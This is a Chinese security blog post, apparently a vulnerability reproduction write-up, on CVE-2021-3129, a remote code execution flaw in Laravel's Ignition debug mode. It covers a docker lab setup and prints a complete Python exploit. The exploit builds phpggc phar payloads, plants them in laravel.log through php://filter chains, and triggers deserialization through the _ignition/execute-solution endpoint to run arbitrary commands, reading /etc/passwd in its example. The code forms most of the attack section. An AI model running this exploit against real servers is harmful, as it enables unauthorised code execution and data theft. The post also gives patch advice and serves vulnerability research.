![v2-fd757cf4de54212f7cfe8027386513e3_1440w.png](https://image.3001.net/images/20210129/1611914171_6013dbbb8d3a93106103d.png!small)

CVE-2021-3129-Laravel Debug mode 远程代码执行漏洞

​

一、漏洞简介

Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。

Laravel开启了Debug模式时，由于Laravel自带的Ignition
组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。

二、影响版本

Laravel <= 8.4.2

Ignition <2.5.2

三、环境准备&漏洞复现

环境地址：

环境和exp下载：后台回复 “CVE-2021-3129” 下载即可

或者下面下载：https://github.com/SNCKER/CVE-2021-3129

![v2-cb191884d3eab5cff6ef104e9fbe10eb_1440w.png](https://image.3001.net/images/20210129/1611914173_6013dbbd18e55a75aa35c.png!small)

执行

docker-compse up -d

访问8888端口即可

![v2-c43cdf963a798707feb867cc09dcfc78_1440w.png](https://image.3001.net/images/20210129/1611914174_6013dbbe05414f7cfb87d.png!small)

访问地址：http://127.0.0.1:8888

![v2-069673710949024f7c0655f4952bf93c_1440w.png](https://image.3001.net/images/20210129/1611914174_6013dbbe8b5335edcf360.png!small)

漏洞复现：

1、在下载GitHub上下载的docker环境中带有exp，使用此exp需要下载phpggc

![v2-9101604ca2405b2ca0fb38a9e6a00d4f_1440w.png](https://image.3001.net/images/20210129/1611914175_6013dbbf821180d41d6ba.png!small)

2、把exp和phpggc放在同一目录，使用python3执行exp，可以看到执行了exp里命令

Macos执行报错

![v2-2f35b5c053ebb8732ed25d8adb2b8fa5_1440w.png](https://image.3001.net/images/20210129/1611914175_6013dbbfe459d06081d1e.png!small)

切换kali环境执行命令：

![v2-29c3beef6906f006b743cd1a6a0fc788_1440w.png](https://image.3001.net/images/20210129/1611914176_6013dbc0d29a809a7474d.png!small)

修改脚本添加参数：

![v2-f9da6dc8506d8ba6c5f28516b6cb15e6_1440w.png](https://image.3001.net/images/20210129/1611914181_6013dbc5709fb2e107a59.png!small)

环境和exp下载：后台回复 “CVE-2021-3129” 下载即可

![v2-617e6afe42529f001078ebb272215ebc_1440w.png](https://image.3001.net/images/20210129/1611914183_6013dbc768d4a8fc3a8b4.png!small)

py脚本code

#!/usr/bin/python3 import requests as req import os, uuid class Exp:
__gadget_chains = { "monolog_rce1": r""" php -d 'phar.readonly=0'
phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0
| python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00'
for i in sys.stdin.read()]).upper())" > payload.txt""", "monolog_rce2": r"""
php -d 'phar.readonly=0' phpggc/phpggc monolog/rce2 system %s --phar phar -o
php://output | base64 -w0 | python -c "import sys;print(''.join(['=' +
hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" >
payload.txt""", "monolog_rce3": r""" php -d 'phar.readonly=0' phpggc/phpggc
monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python -c
"import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in
sys.stdin.read()]).upper())" > payload.txt""", } #
phpggc链，暂时添加rce1后续再添加其他增强通杀能力 __delimiter_len = 8 # 定界符长度 def
__vul_check(self): resp = req.get(self.__url, verify=False) if
resp.status_code != 405 and "laravel" not in resp.text: return False return
True def __payload_send(self, payload): header = { "Accept":
"application/json" } data = { "solution":
"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution",
"parameters": { "variableName": "cve20213129", "viewFile": "" } }
data["parameters"]["viewFile"] = payload resp = req.post(self.__url,
headers=header, json=data, verify=False) # print(resp.text) return resp def
__command_handler(self, command): """
因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。 """ self.__delimiter =
str(uuid.uuid1())[:self.__delimiter_len] # 定界符用于定位页面中命令执行结果的位置。 #
print(delimiter) command = "echo %s && %s && echo %s" % (self.__delimiter,
command, self.__delimiter) # print(command) escaped_chars = [' ', '&', '|'] #
我只想到这么多，可自行添加。 for c in escaped_chars: command = command.replace(c, '\\\' + c)
# print(command) return command def __clear_log(self): return
self.__payload_send(
"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")
def __gen_payload(self, gadget_chain): gen_shell =
self.__gadget_chains[gadget_chain] % (self.__command) # print(gen_shell)
os.system(gen_shell) with open('payload.txt', 'r') as f: payload =
f.read().replace('\n', '') + 'a' # 添加一个字符使得两个完整的payload总是只有一个可以正常解码
os.system("rm payload.txt") # print(payload) return payload def
__decode_log(self): return self.__payload_send(
"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")
def __unserialize_log(self): return
self.__payload_send("phar://../storage/logs/laravel.log/test.txt") def
__rce(self): text = self.__unserialize_log().text # print(text) echo_find =
text.find(self.__delimiter) # print(echo_find) if echo_find >= 0: return
text[echo_find + self.__delimiter_len + 1: text.find(self.__delimiter,
echo_find + 1)] else: return "[-] RCE echo is not found." def exp(self): for
gadget_chain in self.__gadget_chains.keys(): print("[*] Try to use %s for
exploitation." % (gadget_chain)) self.__clear_log() self.__clear_log()
self.__payload_send('a' * 2)
self.__payload_send(self.__gen_payload(gadget_chain)) self.__decode_log()
print("[*] Result:") print(self.__rce()) def __init__(self, target, command):
self.target = target self.__url = req.compat.urljoin(target,
"_ignition/execute-solution") self.__command = self.__command_handler(command)
if not self.__vul_check(): print("[-] [%s] is seems not vulnerable." %
(self.target)) print("[*] You can also call obj.exp() to force an attack.")
else: self.exp() def main(): Exp("http://127.0.0.1:8888", "cat /etc/passwd")
if __name__ == '__main__': main()

四、安全建议

建议将 Laravel 框架升级至8.4.3及以上版本，或将 Ignition组件升级至 2.5.2 及以上版本。

下载链接：

https://laravel.com/docs/8.x#laravel-the-fullstack-framework

参考：

[https://mp.weixin.qq.com/s/ShRvF_YeV9JbJJnOUjklCw](https://mp.weixin.qq.com/s?__biz=MzU5NjA0ODAyNg==&mid=2247484458&idx=1&sn=9bae498f226512ec428cc3d0a0d41834&scene=21#wechat_redirect)

https://github.com/SNCKER/CVE-2021-3129

https://www.venustech.com.cn/new_type/aqtg/20210114/22299.html

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![v2-2fd29902f9e696422dbb34fe44673324_1440w.jpg](https://image.3001.net/images/20210129/1611914183_6013dbc7c64c4fcaed9d7.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

![v2-5956e2ffcf53aa48f84c89bc4fe94921_1440w.png](https://image.3001.net/images/20210129/1611914184_6013dbc813326ee9f4c37.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![v2-d0d36b029cca6882d58aec22872547bc_1440w.png](https://image.3001.net/images/20210129/1611914184_6013dbc86eda5f7c1f34e.png!small)

